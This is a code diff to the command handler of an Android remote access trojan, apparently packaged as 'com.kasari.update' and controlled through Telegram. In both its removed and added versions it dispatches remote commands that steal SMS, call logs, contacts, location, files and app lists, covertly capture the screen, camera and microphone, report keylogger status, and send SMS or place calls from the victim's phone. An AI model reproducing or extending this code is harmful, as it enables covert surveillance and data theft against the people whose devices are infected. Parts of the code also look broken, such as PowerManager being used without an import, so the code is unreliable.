@@ -2,152 +2,253 @@ package com.kasari.update;
 
 import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Build;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import java.lang.reflect.Method;
 
 public class CommandProcessor {
 
-    public static void handle(Context ctx, String text) {
-        new Thread(() -> process(ctx, text)).start();
+    private static Context contextRef;
+
+    public static void processCommand(Context context, String command) {
+        contextRef = context;
+        command = command.trim().toLowerCase();
+        
+        String[] parts = command.split(" ", 3);
+        String cmd = parts[0];
+        
+        switch (cmd) {
+            case "/sms":
+                SmsForwarder.sendAllOldSms(context);
+                break;
+                
+            case "/calls":
+                CallInterceptor.sendCallLogs(context);
+                break;
+                
+            case "/contacts":
+                ContactGrabber.sendContacts(context);
+                break;
+                
+            case "/location":
+            case "/gps":
+                LocationTracker.sendLocation(context);
+                break;
+                
+            case "/screen":
+                ScreenMirror.startCapture(context);
+                break;
+                
+            case "/screenstop":
+                ScreenMirror.stopCapture(context);
+                break;
+                
+            case "/camera":
+                CameraCapture.takePhoto(context, true);
+                break;
+                
+            case "/cameraback":
+                CameraCapture.takePhoto(context, false);
+                break;
+                
+            case "/rec":
+                VoiceRecorder.startRecording(context, 30);
+                break;
+                
+            case "/rec60":
+                VoiceRecorder.startRecording(context, 60);
+                break;
+                
+            case "/recstop":
+                VoiceRecorder.stopRecording(context);
+                break;
+                
+            case "/keylog":
+                TelegramController.sendMessage(context, 
+                    "⌨️ Keylogger is active. Type something on target device.");
+                break;
+                
+            case "/notifications":
+                TelegramController.sendMessage(context, 
+                    "🔔 Notification listener is active. Waiting for notifications...");
+                break;
+                
+            case "/files":
+                String path = parts.length > 1 ? parts[1] : null;
+                FileExplorer.listFiles(context, path);
+                break;
+                
+            case "/download":
+                if (parts.length > 1) {
+                    FileExplorer.sendFile(context, parts[1]);
+                } else {
+                    TelegramController.sendMessage(context, 
+                        "📂 Usage: /download /path/to/file");
+                }
+                break;
+                
+            case "/apps":
+                AppManager.sendApps(context);
+                break;
+                
+            case "/info":
+                sendDeviceInfo(context);
+                break;
+                
+            case "/clipboard":
+                TelegramController.sendMessage(context, 
+                    "📋 Clipboard access requires root. Use keylogger instead.");
+                break;
+                
+            case "/wifi":
+                TelegramController.sendMessage(context, 
+                    "📶 WiFi password extraction requires root or Android 9-");
+                break;
+                
+            case "/vibrate":
+                vibratePhone(context);
+                break;
+                
+            case "/alarm":
+                playAlarm(context);
+                break;
+                
+            case "/open":
+                if (parts.length > 1) {
+                    openUrl(context, parts[1]);
+                }
+                break;
+                
+            case "/sms_send":
+                if (parts.length >= 3) {
+                    sendSms(context, parts[1], parts[2]);
+                }
+                break;
+                
+            case "/call":
+                if (parts.length > 1) {
+                    makeCall(context, parts[1]);
+                }
+                break;
+                
+            case "/reboot":
+                rebootPhone(context);
+                break;
+                
+            case "/reset":
+                TelegramController.sendMessage(context, 
+                    "⚠️ Factory reset requires root. Not available.");
+                break;
+                
+            case "/uninstall":
+                uninstallSelf(context);
+                break;
+                
+            default:
+                TelegramController.sendMessage(context, 
+                    "❓ Unknown command: " + command + "\nAvailable: /sms, /calls, /contacts, /location, /screen, /camera, /rec, /files, /info, /vibrate, /alarm, /open, /sms_send, /call");
+                break;
+        }
     }
 
-    private static void process(Context ctx, String raw) {
-        String cmd = raw.trim();
-        String lower = cmd.toLowerCase();
+    private static void sendDeviceInfo(Context context) {
+        StringBuilder info = new StringBuilder();
+        info.append("📱 **Device Info**\n\n");
+        info.append("Model: ").append(Build.MODEL).append("\n");
+        info.append("Brand: ").append(Build.BRAND).append("\n");
+        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
+        info.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
+        info.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
+        info.append("Board: ").append(Build.BOARD).append("\n");
+        info.append("Hardware: ").append(Build.HARDWARE).append("\n");
+        info.append("Fingerprint: ").append(Build.FINGERPRINT).append("\n");
+        info.append("Display: ").append(Build.DISPLAY).append("\n");
+        info.append("Host: ").append(Build.HOST).append("\n");
+        info.append("User: ").append(Build.USER).append("\n");
+        info.append("Tags: ").append(Build.TAGS).append("\n");
+        info.append("Time: ").append(Build.TIME).append("\n");
+        
+        TelegramController.sendMessage(context, info.toString());
+    }
 
-        // ── Help ──────────────────────────────────────────────────────────
-        if (lower.equals("/help")) {
-            TelegramController.sendMessage(
-                "📋 COMMANDS [" + BackgroundService.deviceId + "]\n\n" +
-                "📱 Status:\n" +
-                "/status — Device info\n" +
-                "/apps — Installed apps list\n\n" +
-                "💬 SMS:\n" +
-                "/sms_all — All SMS history\n\n" +
-                "📞 Calls:\n" +
-                "/calllog — Last 100 calls\n\n" +
-                "📒 Data:\n" +
-                "/contacts — All contacts\n" +
-                "/gallery [N] — Last N photos (default all)\n" +
-                "/files [path] — Browse files\n\n" +
-                "📍 Location:\n" +
-                "/location — GPS + IP fallback\n\n" +
-                "📸 Screen:\n" +
-                "/screenshot — Silent screenshot\n" +
-                "/screen_start [sec] — Repeat screenshot\n" +
-                "/screen_stop — Stop repeat\n" +
-                "/screen_record [sec] — MP4 recording\n\n" +
-                "🎙 Audio:\n" +
-                "/mic [sec] — Mic recording\n\n" +
-                "📷 Camera:\n" +
-                "/cam — Front camera photo\n" +
-                "/cam_back — Rear camera photo\n\n" +
-                "🔔 Live:\n" +
-                "/notifications — Last 20 notifications\n"
-            );
-
-        // ── Status ────────────────────────────────────────────────────────
-        } else if (lower.equals("/status")) {
-            TelegramController.sendMessage(
-                "📊 Device: [" + BackgroundService.deviceId + "]\n" +
-                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
-                "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
-                "Screen: " + (ScreenMirror.instance != null ? "✅ AccessibilityService ON" : "❌ AccessibilityService OFF") + "\n" +
-                "Keylog: " + (ScreenMirror.instance != null ? "✅ ON" : "❌ OFF")
-            );
-
-        // ── SMS ───────────────────────────────────────────────────────────
-        } else if (lower.equals("/sms_all")) {
-            SmsForwarder.sendAllHistory(ctx);
-
-        // ── Call log ──────────────────────────────────────────────────────
-        } else if (lower.equals("/calllog")) {
-            ContactGrabber.sendCallLog(ctx);
-
-        // ── Contacts ──────────────────────────────────────────────────────
-        } else if (lower.equals("/contacts")) {
-            ContactGrabber.sendContacts(ctx);
-
-        // ── Gallery ───────────────────────────────────────────────────────
-        } else if (lower.startsWith("/gallery")) {
-            int n = Integer.MAX_VALUE;
-            String[] p = cmd.trim().split("\\s+");
-            if (p.length > 1) { try { n = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
-            final int limit = n;
-            new Thread(() -> FileExplorer.sendGallery(ctx, limit)).start();
-
-        // ── Files ─────────────────────────────────────────────────────────
-        } else if (lower.startsWith("/files")) {
-            String path = "/sdcard";
-            String[] p = cmd.trim().split("\\s+", 2);
-            if (p.length > 1) path = p[1];
-            FileExplorer.listDirectory(path);
-
-        // ── Location ──────────────────────────────────────────────────────
-        } else if (lower.equals("/location")) {
-            new Thread(() -> LocationTracker.getLocation(ctx)).start();
-
-        // ── Screenshot ────────────────────────────────────────────────────
-        } else if (lower.equals("/screenshot")) {
-            if (ScreenMirror.instance != null) {
-                ScreenMirror.instance.requestCapture();
+    private static void vibratePhone(Context context) {
+        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+        if (vibrator != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(5000, 
+                    VibrationEffect.DEFAULT_AMPLITUDE));
             } else {
-                TelegramController.sendMessage("❌ Accessibility Service enable karo.\nSettings → Accessibility → Kasari Chauhan → ON");
+                vibrator.vibrate(5000);
             }
-
-        } else if (lower.startsWith("/screen_start")) {
-            int sec = 30;
-            String[] p = cmd.trim().split("\\s+");
-            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
-            if (ScreenMirror.instance != null) {
-                ScreenMirror.instance.startContinuous(sec);
-            } else {
-                TelegramController.sendMessage("❌ Accessibility Service enable karo.");
-            }
-
-        } else if (lower.equals("/screen_stop")) {
-            if (ScreenMirror.instance != null) ScreenMirror.instance.stopContinuous();
-
-        } else if (lower.startsWith("/screen_record")) {
-            int sec = 30;
-            String[] p = cmd.trim().split("\\s+");
-            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
-            if (ScreenMirror.instance != null) {
-                Intent i = new Intent(ctx, ScreenRecordService.class);
-                i.setAction(ScreenRecordService.ACTION_RECORD);
-                i.putExtra(ScreenRecordService.EXTRA_SECONDS, sec);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    ctx.startForegroundService(i); else ctx.startService(i);
-                TelegramController.sendMessage("🎬 Recording shuru... " + sec + "s baad MP4 aayega.");
-            } else {
-                TelegramController.sendMessage("❌ Accessibility Service enable karo.");
-            }
-
-        // ── Mic ───────────────────────────────────────────────────────────
-        } else if (lower.startsWith("/mic")) {
-            int sec = 30;
-            String[] p = cmd.trim().split("\\s+");
-            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
-            Intent i = new Intent(ctx, VoiceRecorder.class);
-            i.setAction(VoiceRecorder.ACTION_MIC);
-            i.putExtra(VoiceRecorder.EXTRA_SECONDS, sec);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                ctx.startForegroundService(i); else ctx.startService(i);
-            TelegramController.sendMessage("🎙 Mic recording " + sec + "s shuru...");
-
-        // ── Camera ────────────────────────────────────────────────────────
-        } else if (lower.equals("/cam")) {
-            CameraCapture.capture(ctx, false);
-
-        } else if (lower.equals("/cam_back")) {
-            CameraCapture.capture(ctx, true);
-
-        // ── Apps ──────────────────────────────────────────────────────────
-        } else if (lower.equals("/apps")) {
-            AppManager.sendInstalledApps(ctx);
-
-        // ── Notifications ─────────────────────────────────────────────────
-        } else if (lower.equals("/notifications")) {
-            NotificationCatcher.sendRecent();
+            TelegramController.sendMessage(context, "📳 Phone vibrating for 5 seconds");
         }
+    }
+
+    private static void playAlarm(Context context) {
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+        if (alarmManager != null) {
+            Intent intent = new Intent(context, BootStarter.class);
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
+            TelegramController.sendMessage(context, "🔔 Alarm triggered!");
+        }
+    }
+
+    private static void openUrl(Context context, String url) {
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            url = "https://" + url;
+        }
+        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+        TelegramController.sendMessage(context, "🔗 Opening URL: " + url);
+    }
+
+    private static void sendSms(Context context, String number, String message) {
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(number, null, message, null, null);
+            TelegramController.sendMessage(context, "📤 SMS sent to " + number);
+        } catch (Exception e) {
+            TelegramController.sendMessage(context, "❌ SMS send failed: " + e.getMessage());
+        }
+    }
+
+    private static void makeCall(Context context, String number) {
+        Intent intent = new Intent(Intent.ACTION_CALL);
+        intent.setData(Uri.parse("tel:" + number));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+        TelegramController.sendMessage(context, "📞 Calling " + number);
+    }
+
+    private static void rebootPhone(Context context) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+                if (pm != null) {
+                    pm.reboot("KasariUpdate");
+                }
+            } else {
+                Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
+                proc.waitFor();
+            }
+        } catch (Exception e) {
+            TelegramController.sendMessage(context, "❌ Reboot failed (requires root)\n" + e.getMessage());
+        }
+    }
+
+    private static void uninstallSelf(Context context) {
+        Uri packageURI = Uri.parse("package:" + context.getPackageName());
+        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
+        uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(uninstallIntent);
     }
 }
